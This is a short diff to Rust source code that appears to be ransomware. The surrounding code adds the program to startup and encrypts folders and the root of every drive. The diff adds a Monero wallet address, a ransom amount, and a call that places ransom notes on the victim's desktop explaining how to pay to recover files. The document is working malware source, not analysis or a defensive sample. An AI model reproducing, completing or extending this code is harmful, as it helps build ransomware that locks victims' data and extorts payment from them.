@@ -81,6 +81,8 @@ fn main() {
         ])
         .spawn();*/
 
+    let money_amount = "234.23";
+    let my_monero_addr = "45rzJThpy7aX5VNtPxoSUJaRySFHBWT4ZLL2nWafKj6XgvUiQjfKGLT77wuqrja8KW9tawSrStWArMqZwcNk2JZ7748s9yZ";
     let use_alternate_data_stream = true;
 
     // Adds program to startup
@@ -128,6 +130,12 @@ fn main() {
     for path in folders_to_encrypt {
         encryptor.encrypt_dir(&path);
     }
+
+    // After puts a bunch of files on the desktop explaining how the virus works and how to decrypt their files
+    system_changer::other::put_files_on_desktop_on_how_to_recover_data(
+        my_monero_addr,
+        money_amount,
+    );
 
     // Third encrypts the files in the root folder of every drive, least likely location to be important files in.
     match mountpoints::mountpaths() {
